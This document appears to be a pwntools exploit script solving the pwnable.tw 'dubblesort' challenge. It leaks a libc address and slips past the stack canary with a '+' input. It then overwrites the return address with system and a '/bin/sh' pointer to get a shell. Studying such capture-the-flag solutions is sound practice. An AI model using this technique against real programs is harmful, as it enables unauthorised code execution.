#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug' 
#context.binary = ELF('./dubblesort')
p = process('./dubblesort')
#p = remote('chal.pwnable.tw', 10101)

#p = gdb.debug('./dubblesort', gdbscript='''
#b main
#continue
#''')

padding = "A" * 28
p.sendlineafter('What your name :', padding)

p.recvuntil(padding) 
leak_bytes = u32(p.recv(4))
log.success(f"Leak: {hex(leak_bytes)}")

libc_base = leak_bytes - 0x1b300a
system_addr = libc_base + 0x3adb0
arg_addr = libc_base + 0x15bb2b

log.info('system_addr: ' + hex(system_addr))
log.info('arg_addr:    ' + hex(arg_addr))

p.sendlineafter('How many numbers do you what to sort :', '35')

for i in range(24):
	p.sendlineafter("number : ", '0')
p.sendlineafter("number : ", '+')

for i in range(8):
	p.sendlineafter("number : ", str(system_addr))
for i in range(2):
	p.sendlineafter("number : ", str(arg_addr))

p.interactive()
